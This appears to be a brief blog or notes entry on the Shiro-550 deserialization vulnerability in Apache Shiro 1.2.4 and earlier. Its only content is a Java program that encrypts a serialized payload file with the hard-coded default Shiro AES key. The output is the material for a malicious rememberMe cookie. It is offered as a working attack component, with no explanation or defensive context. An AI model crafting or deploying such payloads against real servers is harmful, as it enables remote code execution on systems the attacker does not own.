---
title: Shiro-550
date: 2026-03-07 09:51:03
updated: 2026-03-08 14:06:16
tags:
  - Web
  - java
  - 反序列化
  - Shiro
---
Shiro <= 1.2.4

# AES\_Payload

```java
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.File;
import java.io.FileInputStream;

public class AESpayload {
    public static void main(String[] args) throws Exception {

        String filename = "bin.ser";
        File file = new File(filename);
        FileInputStream fis = new FileInputStream(file);
        byte[] bytes = new byte[(int) file.length()];
        fis.read(bytes);

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(bytes, key);
        System.out.println(ciphertext.toString());
    }
}
```